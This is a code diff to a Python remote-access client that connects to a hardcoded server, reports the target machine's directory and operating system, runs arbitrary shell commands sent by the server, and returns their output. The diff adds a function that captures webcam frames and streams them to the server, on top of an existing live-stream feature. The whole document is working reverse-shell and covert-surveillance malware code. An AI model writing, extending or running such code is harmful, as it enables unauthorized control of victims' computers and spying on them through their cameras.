@@ -1,7 +1,9 @@
 import socket  # For network (client-server) communication.
+import os  # For handling os executions.
+import subprocess  # For executing system commands.
 import cv2  # For recording the video.
 import threading  # For recording the video in a different thread.
-import subprocess  # For executing shell commands.
+import platform  # We use this to get the os of the target (client).
 
 SERVER_HOST = "192.168.0.8"
 SERVER_PORT = 4000
@@ -12,9 +14,29 @@ SEPARATOR = "<sep>"
 s = socket.socket()
 # Connect to the server.
 s.connect((SERVER_HOST, SERVER_PORT))
+# Get the current directory and os and send it to the server.
+cwd = os.getcwd()
+targets_os = platform.system()
+s.send(cwd.encode())
+s.send(targets_os.encode())
 
 # Global variable for video capture
 cap = None
+
+# Function to record and send the video.
+def record_video():
+    global cap
+    cap = cv2.VideoCapture(0)
+    while True:
+        ret, frame = cap.read()
+        if not ret:
+            break
+        _, frame_bytes = cv2.imencode('.jpg', frame)
+        frame_size = len(frame_bytes)
+        s.sendall(frame_size.to_bytes(4, byteorder='little'))
+        s.sendall(frame_bytes)
+    cap.release()
+    cv2.destroyAllWindows()
 
 # Function to stream live video
 def stream_video():
@@ -34,18 +56,29 @@ def stream_video():
 while True:
     # receive the command from the server.
     command = s.recv(BUFFER_SIZE).decode()
+    splited_command = command.split()
     if command.lower() == "exit":
         # if the command is exit, just break out of the loop.
         break
+    elif command.lower() == "start":
+        # Start recording video in a separate thread
+        recording_thread = threading.Thread(target=record_video)
+        recording_thread.start()
+        output = "Video recording started."
+        print(output)
     elif command.lower() == "stream":
         # Start streaming video in a separate thread
         streaming_thread = threading.Thread(target=stream_video)
         streaming_thread.start()
-        print("Live video streaming started.")
+        output = "Live video streaming started."
+        print(output)
     else:
         # execute the command and retrieve the results.
         output = subprocess.getoutput(command)
+        # get the current working directory as output.
+        cwd = os.getcwd()
         # send the results back to the server.
-        s.send(output.encode())
+        message = f"{output}{SEPARATOR}{cwd}"
+        s.send(message.encode())
 # close client connection.
 s.close()
